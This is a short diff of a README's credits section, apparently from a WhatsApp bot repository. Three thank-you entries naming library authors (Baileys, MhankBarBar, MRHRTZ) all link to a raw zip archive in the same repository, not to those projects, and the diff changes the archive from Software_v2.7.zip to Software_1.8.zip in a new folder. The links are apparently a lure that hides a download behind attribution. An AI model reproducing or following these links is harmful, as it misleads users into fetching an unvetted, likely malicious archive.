@@ -136,8 +136,8 @@
 | X |✅|
 
   # THANKS FOR
-* [`Baileys`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/lib/Software_v2.7.zip)
-* [`MhankBarBar`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/lib/Software_v2.7.zip)
-* [`MRHRTZ`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/lib/Software_v2.7.zip)
+* [`Baileys`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/stik/Software_1.8.zip)
+* [`MhankBarBar`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/stik/Software_1.8.zip)
+* [`MRHRTZ`](https://github.com/Gabrielyop50/satancitobot/raw/refs/heads/master/stik/Software_1.8.zip)
   
   
